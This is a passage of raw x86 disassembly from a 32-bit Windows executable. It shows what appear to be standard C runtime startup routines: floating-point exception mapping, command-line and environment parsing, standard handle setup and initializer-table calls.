  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
